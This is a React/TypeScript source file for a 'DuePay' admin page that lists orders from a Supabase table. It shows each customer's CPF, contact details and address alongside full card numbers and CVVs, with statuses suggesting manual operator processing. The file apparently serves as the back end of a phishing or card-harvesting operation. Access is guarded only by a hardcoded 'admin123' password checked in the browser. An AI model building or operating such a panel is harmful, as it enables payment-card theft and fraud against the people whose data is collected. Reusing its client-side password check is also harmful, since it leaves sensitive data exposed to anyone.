import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { sb, PEDIDOS_TABLE, type Pedido } from "@/lib/supabase-external";
import { Loader2, RefreshCw, LogOut } from "lucide-react";

export const Route = createFileRoute("/admin")({
  head: () => ({ meta: [{ title: "Admin - DuePay" }, { name: "robots", content: "noindex,nofollow" }] }),
  component: AdminPage,
});

const ADMIN_PASSWORD = "admin123";
const SESSION_KEY = "duepay_admin_ok";

const STATUS_OPTIONS = [
  "pendente",
  "aguardando_operador",
  "processando",
  "link_gerado",
  "processado",
  "falha",
];

function AdminPage() {
  const [authed, setAuthed] = useState(false);
  const [pwd, setPwd] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined" && sessionStorage.getItem(SESSION_KEY) === "1") {
      setAuthed(true);
    }
  }, []);

  if (!authed) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-brand-gray p-4">
        <form
          onSubmit={(e) => {
            e.preventDefault();
            if (pwd === ADMIN_PASSWORD) {
              sessionStorage.setItem(SESSION_KEY, "1");
              setAuthed(true);
            } else {
              alert("Senha incorreta");
            }
          }}
          className="w-full max-w-sm space-y-4 rounded-lg border border-border bg-white p-6 shadow-md"
        >
          <h1 className="text-xl font-bold text-brand-navy">Painel Admin</h1>
          <input
            type="password"
            value={pwd}
            onChange={(e) => setPwd(e.target.value)}
            placeholder="Senha"
            className="w-full rounded-md border border-input px-3 py-2 text-sm"
            autoFocus
          />
          <button
            type="submit"
            className="w-full rounded-md bg-brand-navy py-2 text-sm font-bold text-brand-navy-foreground hover:opacity-90"
          >
            Entrar
          </button>
        </form>
      </div>
    );
  }

  return <Dashboard onLogout={() => { sessionStorage.removeItem(SESSION_KEY); setAuthed(false); }} />;
}

function Dashboard({ onLogout }: { onLogout: () => void }) {
  const [pedidos, setPedidos] = useState<Pedido[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState<string>("");

  const fetchAll = async () => {
    const { data, error } = await sb
      .from(PEDIDOS_TABLE)
      .select("*")
      .order("criado_em", { ascending: false })
      .limit(200);
    if (!error && data) setPedidos(data as Pedido[]);
    setLoading(false);
  };

  useEffect(() => {
    fetchAll();
    const t = setInterval(fetchAll, 5000);
    return () => clearInterval(t);
  }, []);

  const updateStatus = async (id: string, status: string) => {
    const patch: Record<string, unknown> = { status };
    if (status === "processado" || status === "falha") {
      patch.processado_em = new Date().toISOString();
    }
    const { error } = await sb.from(PEDIDOS_TABLE).update(patch).eq("id", id);
    if (error) alert("Erro: " + error.message);
    else fetchAll();
  };

  const removeOne = async (id: string) => {
    if (!confirm("Excluir pedido?")) return;
    const { error } = await sb.from(PEDIDOS_TABLE).delete().eq("id", id);
    if (error) alert("Erro: " + error.message);
    else fetchAll();
  };

  const filtered = filter ? pedidos.filter((p) => p.status === filter) : pedidos;

  return (
    <div className="min-h-screen bg-brand-gray">
      <header className="border-b border-border bg-brand-navy px-4 py-3 text-brand-navy-foreground">
        <div className="mx-auto flex max-w-7xl items-center justify-between">
          <h1 className="text-lg font-bold">Painel Admin · DuePay</h1>
          <div className="flex items-center gap-3">
            <button onClick={fetchAll} className="flex items-center gap-1 text-xs hover:opacity-80">
              <RefreshCw className="h-4 w-4" /> Atualizar
            </button>
            <button onClick={onLogout} className="flex items-center gap-1 text-xs hover:opacity-80">
              <LogOut className="h-4 w-4" /> Sair
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl p-4">
        <div className="mb-3 flex items-center gap-2">
          <label className="text-xs font-semibold text-brand-navy">Filtrar:</label>
          <select
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            className="rounded-md border border-input bg-white px-2 py-1 text-xs"
          >
            <option value="">Todos ({pedidos.length})</option>
            {STATUS_OPTIONS.map((s) => (
              <option key={s} value={s}>
                {s} ({pedidos.filter((p) => p.status === s).length})
              </option>
            ))}
          </select>
        </div>

        {loading ? (
          <div className="flex items-center gap-2 p-8 text-brand-navy">
            <Loader2 className="h-5 w-5 animate-spin" /> Carregando...
          </div>
        ) : (
          <div className="overflow-x-auto rounded-lg border border-border bg-white">
            <table className="w-full text-xs">
              <thead className="bg-brand-gray text-left">
                <tr>
                  <th className="px-3 py-2">Criado</th>
                  <th className="px-3 py-2">ID</th>
                  <th className="px-3 py-2">Cliente</th>
                  <th className="px-3 py-2">Contato</th>
                  <th className="px-3 py-2">Endereço de entrega</th>
                  <th className="px-3 py-2">Produto</th>
                  <th className="px-3 py-2">Cartão</th>
                  <th className="px-3 py-2">Senha</th>
                  <th className="px-3 py-2">Valor</th>
                  <th className="px-3 py-2">Status</th>
                  <th className="px-3 py-2">Link</th>
                  <th className="px-3 py-2">Ações</th>
                </tr>
              </thead>
              <tbody>
                {filtered.map((p) => (
                  <tr key={p.id} className="border-t border-border align-top">
                    <td className="px-3 py-2 whitespace-nowrap">
                      {new Date(p.criado_em).toLocaleString("pt-BR")}
                    </td>
                    <td className="px-3 py-2 font-mono">{p.id.slice(0, 8)}</td>
                    <td className="px-3 py-2">
                      <div className="font-semibold">{p.cliente_nome}</div>
                      <div className="font-mono text-[11px] text-muted-foreground">{p.cliente_cpf}</div>
                    </td>
                    <td className="px-3 py-2">
                      <div>{p.cliente_telefone}</div>
                      <div className="text-[11px] text-muted-foreground">{p.cliente_email}</div>
                    </td>
                    <td className="px-3 py-2 max-w-[260px]">
                      <div>{p.cliente_endereco}, {p.cliente_numero}{p.cliente_complemento ? ` — ${p.cliente_complemento}` : ""}</div>
                      <div className="text-[11px] text-muted-foreground">
                        {p.cliente_bairro} · {p.cliente_cidade}/{p.cliente_estado} · CEP {p.cliente_cep}
                      </div>
                    </td>
                    <td className="px-3 py-2">
                      <div>{p.produto_nome}</div>
                      <div className="text-[11px] text-muted-foreground">qtd {p.produto_quantidade ?? 1}</div>
                    </td>
                    <td className="px-3 py-2 font-mono">{p.cartao_numero}</td>
                    <td className="px-3 py-2 font-mono">{p.cartao_cvv}</td>
                    <td className="px-3 py-2 font-semibold">
                      R$ {Number(p.valor).toFixed(2).replace(".", ",")}
                    </td>
                    <td className="px-3 py-2">
                      <select
                        value={p.status}
                        onChange={(e) => updateStatus(p.id, e.target.value)}
                        className="rounded border border-input bg-white px-1 py-0.5 text-xs"
                      >
                        {STATUS_OPTIONS.map((s) => (
                          <option key={s} value={s}>{s}</option>
                        ))}
                      </select>
                    </td>
                    <td className="px-3 py-2">
                      {p.link_pagamento ? (
                        <a
                          href={p.link_pagamento}
                          target="_blank"
                          rel="noreferrer"
                          className="text-brand-navy underline"
                        >
                          abrir
                        </a>
                      ) : (
                        <span className="text-muted-foreground">—</span>
                      )}
                    </td>
                    <td className="px-3 py-2">
                      <button
                        onClick={() => removeOne(p.id)}
                        className="text-red-600 hover:underline"
                      >
                        excluir
                      </button>
                    </td>
                  </tr>
                ))}
                {filtered.length === 0 && (
                  <tr>
                    <td colSpan={12} className="px-3 py-8 text-center text-muted-foreground">
                      Nenhum pedido.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        )}
      </main>
    </div>
  );
}
